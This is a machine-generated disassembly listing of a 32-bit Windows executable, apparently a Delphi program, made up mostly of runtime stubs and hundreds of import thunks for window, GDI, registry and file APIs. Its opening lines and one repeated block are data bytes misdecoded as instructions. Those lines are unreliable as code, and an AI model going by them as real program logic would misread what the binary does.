inc esi
add [ eax + ecx + 0x46 ] bl
add [ esi + 0x265c0046 ] cl
inc esi
clc
inc esi
add [ eax ] al
push cs
inc edi
add al dl
or eax 0x6f200047
add [ eax - 0x17 ] bh
inc esi
add [ eax - 0x17 ] cl
inc esi
add ah al
jmp r-xdata
mov edi 0xde280046
inc esi
add ah ch
fld [ esi ]
call 0xffffffffac47bb89
loopne r-xdata
mov ecx 0xc0080046
inc esi
add al bl
add [ edx + ecx * 2 ] al
inc esi
add ah cl
dec ecx
inc esi
add [ eax + 0x6800469d ] ah
popfd
inc esi
add [ esi + ebx * 4 - 0x6193ffba ] bh
inc esi
add [ ecx + esi * 4 ] ch
inc esi
add ah bh
mov al 0x46
add [ eax + 0x700046a8 ] ah
test al 0x46
add [ eax ] ch
in al dx
inc esi
add al bh
jmp r-xdata
inc edi
add al dh
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x47 ] bl
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax r-xdata
call sub_405e08
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456cb4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_456ccc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456d4c
call sub_403edc
outsd
mov [ esi ] sub_46c2ac
jo r-xdata
add [ eax ] cl
rol [ esi ] 0xd8
cmp [ ecx - 0x46afffba ] 0x46
inc esi
add [ eax ] al
xlat
inc esi
add al dl
salc
inc esi
add [ eax - 0x14 ] ah
inc esi
add [ eax ] dh
in al dx
inc esi
add [ eax - 0x9 ] dl
inc esi
add [ eax ] cl
test [ esi ] sub_46f7b0
xor bh 0x46
add [ eax - 0x8 ] dl
inc esi
add [ eax ] cl
sub_47747b
add [ edi + edx * 8 - 0x28abffba ] al
inc esi
add al ch
mov bh 0x46
add [ edi + esi * 4 - 0x467fffba ] ah
inc esi
add [ eax - 0x47 ] dl
inc esi
add [ eax ] cl
rol [ esi ] 0xd8
mov edi 0xde280046
inc esi
add ah ch
fld [ esi ]
call 0xffffffffac47bb89
loopne r-xdata
clc
inc esi
add [ eax ] al
push cs
inc edi
add al dl
or eax 0x6f200047
add [ eax - 0x17 ] bh
inc esi
add [ eax - 0x17 ] cl
inc esi
add ah al
jmp r-xdata
inc edi
add al dh
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x47 ] bl
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax r-xdata
call sub_405e08
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456cb4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_456ccc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456d4c
call sub_403edc
outsd
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405e08
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456cb4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_456ccc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456d4c
call sub_403edc
sub_401167
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405760
sub_401171
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405774
sub_40123c
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401254
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_4012b4
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012d4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012f4
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401334
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ada
jmp sub_4039d0
sub_401ae1
mov al [ rw-data ]
pop ebp
retn
sub_401bbe
jmp sub_4039d0
sub_401c8c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022a0
retn
sub_40228c
jmp sub_4039d0
sub_402432
jmp sub_4039d0
sub_4026d1
jmp sub_4039d0
sub_402794
call sub_405dbc
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405dbc
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027e8
mov [ rw-data ] edx
call sub_403fb4
sub_40284c
push eax
push edx
push ecx
call sub_405dbc
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402840
retn
sub_402868
retn
sub_4028bc
retn
sub_4028c0
push ebx
call sub_405dbc
mov ebx [ eax + 0x4 ]
call sub_405dbc
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a6c
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a7c
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402af4
mov edx [ eax + 0x1c ]
call sub_402aac
retn
sub_402b87
retn
sub_402d98
mov ecx 0xff
call sub_402da4
retn
sub_402dc8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
sub_402ddc
mov ch [ edx ]
inc edx
or [ eax ] ch
inc eax
dec cl
jne sub_402ddc
retn
j_sub_402df0
jmp sub_402df0
sub_402ded
retn
sub_40317d
jmp sub_4039d0
sub_4031d0
fninit
fwait
fldcw [ rw-data ]
retn
sub_403220
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_40322c
push ebx
mov ebx eax
mov eax ebx
call sub_40325c
call sub_4026e4
mov edx eax
mov eax ebx
call sub_4032a0
pop ebx
retn
sub_403248
push ebx
mov ebx eax
mov eax ebx
call sub_4032f8
mov eax ebx
call sub_402704
pop ebx
retn
sub_40325c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403284
call sub_403608
test dl dl
jle r-xdata
retn
call sub_4035f0
sub_403344
retn
sub_4033cc
jmp sub_4039d0
sub_4033d3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034c4
mov eax 0x8000ffff
retn
sub_4034cc
retn
sub_4034d0
retn
sub_4034d4
retn
sub_4035c9
jmp sub_40371c
sub_4035ce
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a30
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035f0
sub_4035f0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035f8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403608
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403618
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036fc
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403ac9
retn
sub_403c0c
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c9a
jmp sub_40371c
sub_403cfa
jmp sub_40371c
sub_403d14
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c0c
mov [ rw-data ] 0x0
call sub_403cb4
retn
sub_403e4d
retn
sub_403faf
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403fb4
mov [ rw-data ] eax
call sub_403edc
sub_404048
push eax
call ExitThread
sub_404274
retn
sub_4042b0
retn
sub_4042be
retn
sub_4042d7
retn
sub_4042e8
retn
sub_4043cf
retn
j_sub_40451c#2
jmp sub_40451c
sub_404565
retn
sub_40456d
retn
sub_4045af
retn
sub_404708
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402840
sub_404720
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404878
retn
sub_40488a
retn
sub_40488c
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404ab4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402840
call [ rw-data ]
retn
sub_404bb8
mov ecx 0x1
jmp sub_404acc
sub_404bc2
retn
sub_404bc4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402840
call [ rw-data ]
retn
sub_404dea
retn
sub_404dec
mov al 0x11
jmp sub_402840
sub_404e17
retn
sub_404e28
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404cf8
pop ebp
retn 0x4
j_sub_404acc
jmp sub_404acc
sub_404e3d
retn
sub_404e40
call sub_404fe0
retn
sub_40506c
call sub_405044
retn
sub_4053b5
jmp sub_4039d0
sub_405520
call sub_405530
retn
sub_405528
call sub_405550
retn
sub_405530
push ebx
mov ebx eax
mov eax 0x8
call sub_4026e4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4055eb
jmp sub_40371c
sub_40560c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405680
jmp sub_4039d0
sub_405687
pop ecx
pop ebp
retn
sub_405700
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_40570c
add eax 0x4
push eax
call sub_40131c
retn
sub_405718
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402840
sub_405728
call sub_40322c
mov [ eax + 0x4 ] 0x1
retn
sub_405760
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_401314
pop ebp
retn 0x4
sub_405a4f
jmp sub_4039d0
sub_405a56
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405af3
jmp sub_4039d0
sub_405afa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b43
jmp sub_4039d0
sub_405b4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c0e
jmp sub_4039d0
sub_405c15
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405c66
jmp sub_4039d0
sub_405c6d
pop ebp
retn
sub_405d44
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405d64
push eax
push 0x40
call LocalAlloc
retn
sub_405d70
mov eax 0x10
retn
sub_405dfc
mov eax rw-data
call sub_40560c
retn
sub_405e71
jmp sub_4039d0
sub_405e78
pop ebp
retn
sub_405e7c
sub [ rw-data ] 0x1
retn
sub_405e84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405ea0
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405ee9
jmp sub_4039d0
sub_405ef0
pop ebp
retn
sub_405ef4
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ __import_lookup_table_6(kernel32:GetFileSize) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ __import_lookup_table_6(kernel32:GetTempPathA) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ __import_lookup_table_6(kernel32:ResumeThread) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SetThreadPriority
jmp [ __import_lookup_table_6(kernel32:SetThreadPriority) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406224
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SuspendThread
jmp [ SuspendThread@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreateICA
jmp [ __import_lookup_table_8(gdi32:CreateICA) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
EndDoc
jmp [ __import_lookup_table_8(gdi32:EndDoc) ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ __import_lookup_table_8(gdi32:GetTextMetricsA) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginPaint
jmp [ BeginPaint@IAT ]
BringWindowToTop
jmp [ BringWindowToTop@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMDIWindowA
jmp [ __import_lookup_table_9(user32:CreateMDIWindowA) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ __import_lookup_table_9(user32:GetCursorPos) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetDlgItem
jmp [ __import_lookup_table_9(user32:GetDlgItem) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetLastInputInfo
jmp [ __import_lookup_table_9(user32:GetLastInputInfo) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
InvalidateRect
jmp [ __import_lookup_table_9(user32:InvalidateRect) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406998
call GetTickCount
retn
sub_4069a0
xor eax eax
retn
sub_4069a4
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_4069b4
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_4069d0
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_4069e4
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406a1c
call sub_40698c
retn
sub_406a24
call sub_40698c
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406c01
jmp sub_4039d0
sub_406c08
pop ebp
retn
sub_406c0c
sub [ rw-data ] 0x1
retn
sub_406c39
jmp sub_4039d0
sub_406c40
pop ebp
retn
sub_406c44
sub [ rw-data ] 0x1
retn
sub_406f51
jmp sub_4039d0
sub_406f58
pop ebp
retn
